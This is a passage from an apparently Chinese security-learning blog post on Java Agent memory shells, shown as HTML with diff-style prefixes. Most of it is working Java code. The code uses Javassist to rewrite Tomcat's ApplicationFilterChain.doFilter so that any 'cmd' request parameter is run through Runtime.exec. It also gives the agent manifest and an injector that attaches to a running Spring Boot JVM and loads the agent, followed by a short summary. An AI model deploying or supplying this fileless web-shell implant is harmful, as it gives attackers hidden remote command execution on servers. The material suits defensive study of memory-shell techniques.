+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>transform</span>(ClassLoader loader, String className, Class<span style=color:#f92672>&lt;?&gt;</span> classBeingRedefined, ProtectionDomain protectionDomain, <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> classfileBuffer) <span style=color:#66d9ef>throws</span> IllegalClassFormatException {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//获取CtClass 对象的容器 ClassPool            </span>
+</span></span><span style=display:flex><span>            ClassPool classPool <span style=color:#f92672>=</span> ClassPool.<span style=color:#a6e22e>getDefault</span>();  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//添加额外的类搜索路径  </span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (classBeingRedefined <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {  
+</span></span><span style=display:flex><span>                ClassClassPath ccp <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassClassPath(classBeingRedefined);  
+</span></span><span style=display:flex><span>                classPool.<span style=color:#a6e22e>insertClassPath</span>(ccp);  
+</span></span><span style=display:flex><span>            }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//获取目标类  </span>
+</span></span><span style=display:flex><span>            CtClass ctClass <span style=color:#f92672>=</span> classPool.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>);  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//获取目标方法  </span>
+</span></span><span style=display:flex><span>            CtMethod ctMethod <span style=color:#f92672>=</span> ctClass.<span style=color:#a6e22e>getDeclaredMethod</span>(<span style=color:#e6db74>&#34;doFilter&#34;</span>);  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//设置方法体  </span>
+</span></span><span style=display:flex><span>            String body <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;{&#34;</span> <span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;javax.servlet.http.HttpServletRequest request = $1\n;&#34;</span> <span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;String cmd=request.getParameter(\&#34;cmd\&#34;);\n&#34;</span> <span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;if (cmd !=null){\n&#34;</span> <span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;  Runtime.getRuntime().exec(cmd);\n&#34;</span> <span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;  }&#34;</span><span style=color:#f92672>+</span>  
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;}&#34;</span>;  
+</span></span><span style=display:flex><span>            ctMethod.<span style=color:#a6e22e>setBody</span>(body);  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//返回目标类字节码  </span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> ctClass.<span style=color:#a6e22e>toBytecode</span>();  
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> bytes;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>catch</span> (Exception e){  
+</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>修改<code>MAINFEST.MF</code>配置以及 Agent 主类代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>agentmain_transform</span> {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>agentmain</span>(String args, Instrumentation inst) <span style=color:#66d9ef>throws</span> InterruptedException, UnmodifiableClassException {  
+</span></span><span style=display:flex><span>        Class <span style=color:#f92672>[]</span> classes <span style=color:#f92672>=</span> inst.<span style=color:#a6e22e>getAllLoadedClasses</span>();  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//获取目标JVM加载的全部类  </span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span>(Class cls : classes){  
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (cls.<span style=color:#a6e22e>getName</span>().<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>)){  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//添加一个transformer到Instrumentation，并重新触发目标类加载  </span>
+</span></span><span style=display:flex><span>                inst.<span style=color:#a6e22e>addTransformer</span>(<span style=color:#66d9ef>new</span> Filter_Transform(),<span style=color:#66d9ef>true</span>);  
+</span></span><span style=display:flex><span>                inst.<span style=color:#a6e22e>retransformClasses</span>(cls);  
+</span></span><span style=display:flex><span>            }  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-mf data-lang=mf><span style=display:flex><span><span style=color:#a6e22e>Manifest-Version</span><span style=color:#f92672>:</span> 1.0  
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Agent-Class</span><span style=color:#f92672>:</span> com.drunkbaby.agentmain_transform
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Can-Redefine-Classes</span><span style=color:#f92672>:</span> true  
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Can-Retransform-Classes</span><span style=color:#f92672>:</span> true
+</span></span></code></pre></div><p>然后准备注入类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Inject_Agent</span> {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException {  
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//调用VirtualMachine.list()获取正在运行的JVM列表  </span>
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>VirtualMachineDescriptor<span style=color:#f92672>&gt;</span> list <span style=color:#f92672>=</span> VirtualMachine.<span style=color:#a6e22e>list</span>();  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span>(VirtualMachineDescriptor vmd : list){  
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(vmd.<span style=color:#a6e22e>displayName</span>());  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  </span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(vmd.<span style=color:#a6e22e>displayName</span>().<span style=color:#a6e22e>contains</span>(<span style=color:#e6db74>&#34;JavaAgentSpringBootApplication&#34;</span>)){  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//连接指定JVM  </span>
+</span></span><span style=display:flex><span>                VirtualMachine virtualMachine <span style=color:#f92672>=</span> VirtualMachine.<span style=color:#a6e22e>attach</span>(vmd.<span style=color:#a6e22e>id</span>());  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//加载Agent  </span>
+</span></span><span style=display:flex><span>                virtualMachine.<span style=color:#a6e22e>loadAgent</span>(<span style=color:#e6db74>&#34;E:\\Coding\\Java\\JavaSecurityLearning\\JavaSecurity\\MemoryShell\\Java-Agent-Memshell\\AgentInjectionExample\\target\\AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar&#34;</span>);  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//断开JVM连接  </span>
+</span></span><span style=display:flex><span>                virtualMachine.<span style=color:#a6e22e>detach</span>();  
+</span></span><span style=display:flex><span>            }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=总结>总结
+<a class=anchor href=#%e6%80%bb%e7%bb%93>#</a></h2><p>对比传统的 Tomcat 内存马，Agent 内存马在实现形式上还是打 Tomcat 内存马，然而实现角度是遍历所有 JVM 进程，然后向进程中注入对应的 Agent 类，在 Agent 类中通过<code>ClassPool</code>生成恶意代码。</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#什么是-java-agent>什么是 Java Agent</a></li><li><a href=#几种-java-agent-实例>几种 Java Agent 实例</a><ul><li><a href=#premain-agent>premain-Agent</a></li><li><a href=#agentmain-agent>agentmain-Agent</a></li><li><a href=#动态修改字节码>动态修改字节码</a></li><li><a href=#instrumentation-的局限性>Instrumentation 的局限性</a></li></ul></li><li><a href=#agent-内存马>Agent 内存马</a><ul><li><a href=#java-agent-实现-spring-filter-内存马>Java Agent 实现 Spring Filter 内存马</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
